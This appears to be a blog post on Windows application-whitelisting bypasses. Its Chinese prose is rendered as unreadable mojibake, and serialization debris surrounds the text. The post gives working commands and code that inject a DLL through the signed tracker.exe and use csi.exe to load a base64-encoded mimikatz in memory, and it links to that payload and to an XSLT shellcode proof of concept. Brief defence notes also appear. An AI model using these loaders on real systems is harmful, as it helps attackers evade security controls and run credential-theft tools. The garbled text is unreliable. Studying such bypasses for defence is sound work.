I"+<p><strong>About:</strong></p>

<ul>
  <li>
    <p>use tracker to load dll</p>
  </li>
  <li>
    <p>use csi to bypass Application Whitelisting</p>
  </li>
  <li>
    <p>execute C# from XSLT file</p>
  </li>
</ul>

<p><strong>ç›®å½•:</strong></p>

<ul>
  <li>
    <p>ä»‹ç»åˆ©ç”¨tracker.exeåŠ è½½dllçš„æ–¹æ³•</p>
  </li>
  <li>
    <p>å¦‚ä½•åˆ©ç”¨csi.exeç»•è¿‡Windows Device Guard</p>
  </li>
  <li>
    <p>åœ¨XSLTæ–‡ä»¶è½¬æ¢è¿‡ç¨‹ä¸­æ‰§è¡ŒC#ä»£ç </p>
  </li>
</ul>

<h2 id="0x01-use-tracker-to-load-dll">0x01 use tracker to load dll</h2>
<hr />

<p><strong>Reference:</strong></p>

<p>https://twitter.com/subTee/status/793151392185589760</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/2-1.png" alt="Alt text" /></p>

<p><strong>ç®€ä»‹ï¼š</strong></p>

<p>Caseyåœ¨Twitteråˆ†äº«çš„ä¸€ä¸ªæŠ€å·§ï¼Œåˆ©ç”¨tracker.exeèƒ½å¤Ÿåˆ›å»ºè¿›ç¨‹ï¼Œæ³¨å…¥dllï¼Œç‰¹åˆ«çš„æ˜¯tracker.exeæ¥è‡ªäºSDKä¸­ï¼ŒåŒ…å«å¾®è½¯çš„æ•°å­—ç­¾åï¼Œæœ¬æ–‡å°†è¦åˆ†äº«åˆ©ç”¨è¯¥æŠ€å·§çš„ä¸€äº›å¿ƒå¾—,è¡¥å……ä¸€ä¸ªç›´æ¥åˆ©ç”¨tracker.exeåŠ è½½dllçš„æŠ€å·§</p>

<p><strong>Tracker.exeï¼š</strong></p>

<p>Tracker.exe is used to start a process and inject FileTracker.dll into it just after creation.</p>

<p>The file accesses of the target process are tracked, and written to a .tlog file</p>

<p>å¸¸è§ç›®å½•(éœ€è¦å®‰è£…SDK):</p>

<ul>
  <li>
    <p>C:\Program Files (x86)\Microsoft SDKs\Windows\v8.1A\bin\NETFX 4.5.1 Tools</p>
  </li>
  <li>
    <p>C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.6.1 Tools\x64</p>
  </li>
</ul>

<p><strong>è¯­æ³•ï¼š</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tracker.exe [é€‰é¡¹] [@è·Ÿè¸ªå™¨å“åº”æ–‡ä»¶] /c [å‘½ä»¤è¡Œ]

 /d æ–‡ä»¶.dll                : ä½¿ç”¨è·Ÿè¸ª dll æ–‡ä»¶.dll å¯åŠ¨è¿›ç¨‹ã€‚(é»˜è®¤å€¼: é€šè¿‡ PATH æä¾›çš„ FileTracker.dll)

 /i[f] &lt;è·¯å¾„&gt;               :  ç”¨äºè·Ÿè¸ªæ—¥å¿—è¾“å‡ºçš„ä¸­é—´ç›®å½•ã€‚(ä½¿ç”¨ /if å¯ç«‹å³å°†è·¯å¾„å±•å¼€ä¸ºå®Œæ•´è·¯å¾„)(é»˜è®¤å€¼: æ‰€è·Ÿè¸ªè¿›ç¨‹ä¸­çš„å½“å‰ç›®å½•)

 /o                         : å¯¹æ¯ä¸ªæ–‡ä»¶æ‰§è¡Œè·Ÿè¸ªæ“ä½œ

 /m                         : åœ¨è·Ÿè¸ªæ—¥å¿—ä¸­åŒ…å«ç¼ºå°‘çš„æ–‡ä»¶ï¼Œå³åœ¨è¿›ç¨‹å…³é—­ä¹‹å‰åˆ é™¤çš„é‚£äº›æ–‡ä»¶

 /u                         : ä¸ä»è·Ÿè¸ªæ—¥å¿—ä¸­åˆ é™¤é‡å¤çš„æ–‡ä»¶æ“ä½œ

 /t                         : è·Ÿè¸ªå‘½ä»¤è¡Œ(å°†å±•å¼€ä½¿ç”¨â€œ@æ–‡ä»¶åâ€è¯­æ³•æŒ‡å®šçš„å“åº”æ–‡ä»¶)

 /a                         : å¯ç”¨æ‰©å±•è·Ÿè¸ª: GetFileAttributesã€GetFileAttributesEx

 /e                         : å¯ç”¨æ‰©å±•è·Ÿè¸ª: GetFileAttributesã€GetFileAttributesExã€RemoveDirectoryã€CreateDirectory

 /k                         : åœ¨è·Ÿè¸ªæ—¥å¿—æ–‡ä»¶åä¸­ä¿ç•™å®Œæ•´çš„å·¥å…·é“¾

 /r æ–‡ä»¶ 1;æ–‡ä»¶ 2;..;æ–‡ä»¶ n : æ­£åœ¨è·Ÿè¸ªçš„ä¸»è¦æ ¹è¾“å…¥æ–‡ä»¶(é»˜è®¤å€¼: æ— )

 /c [å‘½ä»¤è¡Œ]                : è¦è·Ÿè¸ªçš„å‘½ä»¤(å¿…é¡»æ˜¯æœ€åä¸€ä¸ªå‚æ•°)

 /?                         : æœ¬å¸®åŠ©æ–‡æœ¬
</code></pre></div></div>

<p><strong>å®é™…æµ‹è¯•ï¼š</strong></p>

<p>cmdä¸‹è¿è¡Œï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tracker.exe /d test.dll /c cmd.exe
</code></pre></div></div>

<p>å¦‚å›¾ï¼ŒæˆåŠŸåŠ è½½test.dll</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/2-2.png" alt="Alt text" /></p>

<p>test.dllä¸ºé»˜è®¤åŒ…å«å¯¼å‡ºå‡½æ•°çš„dllå°±å¥½ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
#include &lt;windows.h&gt;
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
           )
{
  switch (ul_reason_for_call)
  {
  case DLL_PROCESS_ATTACH:
    MessageBox(NULL,L"testexport", L"testexport",MB_OK);
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}
</code></pre></div></div>

<p><strong>åˆ†æï¼š</strong></p>

<p>è¿™ä¸ªæŠ€å·§æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š</p>

<ul>
  <li>
    <p>tracker.exeåŒ…å«å¾®è½¯æ•°å­—ç­¾åï¼Œå¯ç»•è¿‡åº”ç”¨ç¨‹åºç™½åå•çš„é™åˆ¶</p>
  </li>
  <li>
    <p>tracker.exeå¯ä»¥åœ¨å¯åŠ¨è¿›ç¨‹çš„åŒæ—¶åŠ è½½dll</p>
  </li>
</ul>

<p>ä½†æ˜¯å¦‚æœåªæƒ³é€šè¿‡tracker.exeåŠ è½½dllçš„è¯ï¼Œå­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š</p>

<p>é€‰æ‹©ä¸å­˜åœ¨æˆ–æ˜¯æƒé™ä¸å¤Ÿçš„è¿›ç¨‹ï¼Œæ— æ³•åŠ è½½dll</p>

<p>ä½†æ˜¯ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªç‰¹æ®Šçš„è¿›ç¨‹æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¦‚<code class="language-plaintext highlighter-rouge">svchost.exe</code>ï¼Œé‚£ä¹ˆåœ¨åŠ è½½dllåï¼Œè¿›ç¨‹svchost.exeå¯ä»¥è‡ªåŠ¨é€€å‡º,è¿™å°±å®ç°äº†é€šè¿‡tracker.exeåŠ è½½dll</p>

<p><strong>é˜²å¾¡ï¼š</strong></p>

<p>å¯¹tracker.exeæ·»åŠ é»‘åå•è§„åˆ™</p>

<h2 id="0x02-use-csi-to-bypass-application-whitelisting">0x02 use csi to bypass Application Whitelisting</h2>
<hr />

<p><strong>Reference:</strong></p>

<p>http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html</p>

<p><strong>ç®€ä»‹ï¼š</strong></p>

<p>åŒæ ·æ˜¯åˆ©ç”¨å¸¦æœ‰å¾®è½¯ç­¾åçš„exeç»•è¿‡ç™½åå•çš„æŠ€å·§ï¼ŒMatt Graeberæ›¾ä»‹ç»è¿‡å¦‚ä½•åˆ©ç”¨cdb.exeç»•è¿‡Windows Device Guardï¼ŒCaseyè¿™æ¬¡ä»‹ç»çš„æ˜¯ä½¿ç”¨C#ç›¸å…³çš„csi.exeç»•è¿‡Windows Device Guardçš„æŠ€å·§ï¼Œæœ¬æ–‡å°†åˆ†äº«è¿™ä¸ªæŠ€å·§çš„ç ”ç©¶å¿ƒå¾—ï¼Œå¹¶å®ŒæˆCaseyåœ¨åšå®¢ä¸­ç•™ç»™è¯»è€…çš„ä½œä¸šâ€”â€”åœ¨win10æœªå®‰è£…VS2015çš„ç¯å¢ƒä¸‹å¦‚ä½•ä½¿ç”¨csi.exe</p>

<p><strong>csi.exeï¼š</strong></p>

<p>åœ¨Visual Studio 2015 Update 1å¼•å…¥</p>

<p>å®‰è£…åä½ç½®åœ¨C:\Program Files (x86)\MSBuild\14.0\Bin</p>

<p><strong>å®é™…æµ‹è¯•ï¼š</strong></p>

<p>æµ‹è¯•ç³»ç»Ÿï¼š</p>

<p>Win10 å®‰è£…Visual Studio 2015</p>

<p><strong>1.åœ¨csiç¼–è¯‘ç¯å¢ƒä¸­ç›´æ¥æ‰§è¡Œä»£ç </strong></p>

<p>ç›´æ¥è¿è¡Œcsi.exeä¼šè¿›å…¥ç¼–è¯‘ç¯å¢ƒï¼Œå¯åœ¨é‡Œé¢ç›´æ¥å¡«å…¥ä»£ç å¹¶è¿è¡Œ</p>

<p>å¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-1.png" alt="Alt text" /></p>

<p>æµ‹è¯•Caseyåœ¨æ–‡ç« ä¸­çš„ä»£ç ï¼Œä»æ–‡ä»¶ä¸­è¯»å–base64åŠ å¯†è¿‡çš„mimikatz.exeï¼Œè§£å¯†æ‰§è¡Œï¼Œä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Reflection;
string s = System.IO.File.ReadAllText(@"c:\\test\\katz.txt");
byte[] b = System.Convert.FromBase64String(s);
Assembly a = Assembly.Load(b);
MethodInfo method = a.EntryPoint;
object o = a.CreateInstance(method.Name);
method.Invoke(o, null);
</code></pre></div></div>

<p>mimikatz.exeä½œbase64åŠ å¯†åä¿å­˜çš„æ–‡ä»¶katz.txtå·²ä¸Šä¼ ï¼Œåœ°å€ä¸ºï¼š
https://raw.githubusercontent.com/3gstudent/test/master/katz.txt</p>

<p>æµ‹è¯•å¦‚å›¾ï¼ŒæˆåŠŸè§£å¯†å¹¶æ‰§è¡Œmimikatz.exe</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-2.png" alt="Alt text" /></p>

<p><strong>2.æ‰§è¡Œ.csxæ–‡ä»¶ä¸­çš„ä»£ç </strong></p>

<p>å°†ä¸Šè¿°æµ‹è¯•ä»£ç å†™åœ¨katz.csxæ–‡ä»¶ä¸­</p>

<p>csiç¼–è¯‘ç¯å¢ƒä¸‹è¿è¡Œï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#load "c:\\test\\katz.csx"
</code></pre></div></div>

<p><strong>æ³¨:</strong></p>

<p>æ–‡ä»¶è·¯å¾„å¿…é¡»åŒ…å«åŒå¼•å·ï¼Œloadå‰ç¼€<code class="language-plaintext highlighter-rouge">#</code></p>

<p>æµ‹è¯•å¦‚å›¾ï¼ŒæˆåŠŸæ‰§è¡Œ</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-3.png" alt="Alt text" /></p>

<p><strong>3.åœ¨cmdä¸‹è¿è¡Œ</strong></p>

<p>å¯åœ¨cmdä¸‹csi.exeåé¢ç›´æ¥åŠ .csxæ–‡ä»¶çš„è·¯å¾„</p>

<p>ä¾‹å¦‚:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"C:\Program Files (x86)\MSBuild\14.0\Bin\csi.exe" c:\test\katz.csx
</code></pre></div></div>

<p>æµ‹è¯•å¦‚å›¾ï¼ŒæˆåŠŸæ‰§è¡Œ</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-4.png" alt="Alt text" /></p>

<p>å½“ç„¶ï¼Œåœ¨Win10ä¸Šé¢ä¸æ˜¯å¿…é¡»å®‰è£…vs2015æ‰èƒ½ä½¿ç”¨csi.exeï¼Œè¿™ä¹Ÿæ˜¯Caseyç•™ç»™è¯»è€…çš„ä½œä¸šï¼Œæ‰¾åˆ°csi.exeä½¿ç”¨éœ€è¦çš„ä¾èµ–é¡¹</p>

<p>æˆ‘å·²ç»å®Œæˆäº†è¿™ä¸ªä½œä¸šï¼Œä¾èµ–é¡¹æ–‡ä»¶æœ€å°‘éœ€è¦6.77MBï¼Œå¯åœ¨csi.exeçš„åŒçº§ç›®å½•<code class="language-plaintext highlighter-rouge">C:\Program Files (x86)\MSBuild\14.0\Bin</code>ä¸‹æ‰¾åˆ°ï¼Œå°†csi.exeåŠå…¶ä¾èµ–æ€§ä¸Šä¼ åˆ°Win10ç³»ç»Ÿå³å¯ç›´æ¥ä½¿ç”¨</p>

<p>ä¾èµ–é¡¹æ–‡ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š</p>

<ul>
  <li>Microsoft.CodeAnalysis.CSharp.dll</li>
  <li>Microsoft.CodeAnalysis.CSharp.Scripting.dll</li>
  <li>Microsoft.CodeAnalysis.dll</li>
  <li>Microsoft.CodeAnalysis.Scripting.dll</li>
  <li>System.AppContext.dll</li>
  <li>System.Collections.Immutable.dll</li>
  <li>System.IO.FileSystem.dll</li>
  <li>System.IO.FileSystem.Primitives.dll</li>
  <li>System.Reflection.Metadata.dll</li>
</ul>

<p><strong>è¡¥å……ï¼š</strong></p>

<p>è¯¥æ–¹æ³•åªç”¨äºWin10</p>

<p><strong>é˜²å¾¡ï¼š</strong>
Matt Graeberåˆ†äº«äº†ä»–çš„åº”å¯¹æ–¹æ³•ï¼Œæ›´æ–°äº†Device Guard Bypass MitigationRulesï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://twitter.com/mattifestation/status/781211230065332224</p>

<p>https://github.com/mattifestation/DeviceGuardBypassMitigationRules/</p>

<h2 id="0x03-execute-c-from-xslt-file">0x03 execute C# from XSLT file</h2>
<hr />

<p><strong>Reference:</strong></p>

<p>https://twitter.com/subTee/status/796737674954608641</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/4-1.png" alt="Alt text" /></p>

<p><strong>POCåœ°å€:</strong></p>

<p>https://gist.github.com/subTee/c34d0499e232c1501ff9f0a8dd302cbd#file-script-ps1</p>

<p><strong>ç®€ä»‹ï¼š</strong></p>

<p>Caseyåœ¨Twitteråˆ†äº«äº†ä¸€ä¸ªæœ‰æ„æ€çš„æŠ€å·§ï¼Œåœ¨XSLTæ–‡ä»¶è½¬æ¢çš„è¿‡ç¨‹ä¸­æ‰§è¡ŒC#ä»£ç ï¼Œæœ¬èŠ‚å°†åˆ†äº«è¿™ä¸ªæŠ€å·§çš„å¿ƒå¾—ï¼Œå¹¶æ‰©å……POCï¼Œç»“åˆä¹‹å‰çš„ä»£ç ï¼Œå®ç°é€šè¿‡XSLTæ–‡ä»¶æ‰§è¡Œshellcode</p>

<p><strong>XSLTï¼š</strong></p>

<p>XSLTæ˜¯extensible stylesheet language transformation(æ‰©å±•æ ·å¼è¡¨è½¬æ¢è¯­è¨€)çš„ç¼©å†™</p>

<p>ç”¨äºå°†XMLæ–‡æ¡£è½¬æ¢æˆä»¥ä¸‹ä¸€ç§æ ¼å¼ï¼š</p>
<ul>
  <li>HTML</li>
  <li>XML</li>
  <li>XHTML</li>
  <li>XSLT</li>
  <li>æ–‡æœ¬</li>
</ul>

<p>åœ¨è½¬æ¢æ“ä½œçš„è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥æ‰§è¡Œc#æˆ–VBä»£ç ï¼ŒåŒVisualStudio Persistenceä¸­åœ¨ç¼–è¯‘è¿‡ç¨‹æ‰§è¡Œä»£ç ç±»ä¼¼</p>

<p>XSLTåœ¨webå‰ç«¯ä¸­ç”¨çš„æ¯”è¾ƒå¤š</p>

<p><strong>å®é™…æµ‹è¯•ï¼š</strong></p>

<p>å°†calc.xsltï¼Œexample.xmlï¼Œscript.ps1ä¸‰ä¸ªæ–‡ä»¶æ”¾äºåŒçº§ç›®å½•ï¼Œè®¾ç½®script.ps1ä¸­çš„è·¯å¾„å˜é‡$path</p>

<p>æ‰§è¡Œscript.ps1ï¼Œç”Ÿæˆoutput.xmlï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼Œå¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/4-2.png" alt="Alt text" /></p>

<p>å‚è€ƒå¦‚ä¸‹é“¾æ¥å¯è·å¾—ç¼–å†™XSLTçš„æ›´å¤šæç¤ºï¼š
https://msdn.microsoft.com/en-us/library/wxaw5z5e(v=vs.110).aspx</p>

<p>äºæ˜¯åŸºäºä¹‹å‰çš„ç ”ç©¶ï¼Œå®ç°äº†é€šè¿‡XSLTè°ƒç”¨C#æ‰§è¡Œshellcodeï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Execute-CSharp-From-XSLT-TEST/</p>

<p><strong>æ³¨:</strong></p>

<p>ä¸»è¦æ˜¯ä¿®æ”¹äº†calc.xsltæ–‡ä»¶</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
:ET